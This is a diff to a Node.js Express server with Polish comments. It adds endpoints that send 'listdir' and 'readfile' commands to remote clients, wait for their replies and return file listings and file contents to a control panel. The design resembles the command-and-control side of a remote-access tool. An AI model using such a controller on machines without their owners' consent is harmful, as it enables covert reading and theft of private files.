@@ -28,6 +28,9 @@ const results = {};
 // { [clientName]: { currentPath: string, files: [{name, type}] } }
 const fileTrees = {};
 
+// Struktura na zawartość plików
+const fileContents = {};
+
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -122,6 +125,20 @@ app.post('/files', authMiddleware, (req, res) => {
   res.sendStatus(200);
 });
 
+// Klient wysyła zawartość pliku
+app.post('/file', authMiddleware, (req, res) => {
+  const { client, path, content } = req.body;
+  if (!client || !path || content === undefined) return res.status(400).send('Brakuje danych');
+
+  // Zapisujemy zawartość pliku
+  if (!fileContents[client]) {
+    fileContents[client] = {};
+  }
+  fileContents[client][path] = content;
+
+  res.sendStatus(200);
+});
+
 // Panel pobiera listę plików i folderów dla klienta
 app.get('/files', (req, res) => {
   const client = req.query.client;
@@ -131,6 +148,62 @@ app.get('/files', (req, res) => {
   if (!data) return res.status(404).send('Brak danych o plikach');
 
   res.json(data);
+});
+
+// ------------------- API dla panelu (eksplorator plików) --------------------
+
+// Panel żąda listy plików - wysyła komendę do klienta
+app.get('/api/files', authMiddleware, (req, res) => {
+  const path = req.query.path;
+  const client = req.query.client;
+  
+  if (!path || !client) return res.status(400).send('Brakuje parametrów');
+  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+
+  // Wyślij komendę do klienta
+  commands[client] = `listdir ${path}`;
+  
+  // Czekaj na odpowiedź (w praktyce panel powinien pollować)
+  const checkForData = async () => {
+    for (let i = 0; i < 30; i++) { // maksymalnie 15 sekund oczekiwania
+      await new Promise(resolve => setTimeout(resolve, 500));
+      const data = fileTrees[client];
+      if (data && data.currentPath === path) {
+        return res.json(data);
+      }
+    }
+    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+  };
+
+  checkForData();
+});
+
+// Panel żąda zawartości pliku - wysyła komendę do klienta
+app.get('/api/file', authMiddleware, (req, res) => {
+  const path = req.query.path;
+  const client = req.query.client;
+  
+  if (!path || !client) return res.status(400).send('Brakuje parametrów');
+  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
+
+  // Wyślij komendę do klienta
+  commands[client] = `readfile ${path}`;
+  
+  // Czekaj na odpowiedź
+  const checkForData = async () => {
+    for (let i = 0; i < 30; i++) { // maksymalnie 15 sekund oczekiwania
+      await new Promise(resolve => setTimeout(resolve, 500));
+      if (fileContents[client] && fileContents[client][path] !== undefined) {
+        const content = fileContents[client][path];
+        // Usuń po pobraniu, aby nie zaśmiecać pamięci
+        delete fileContents[client][path];
+        return res.json({ content });
+      }
+    }
+    res.status(408).send('Timeout - brak odpowiedzi od klienta');
+  };
+
+  checkForData();
 });
 
 app.listen(port, () => {
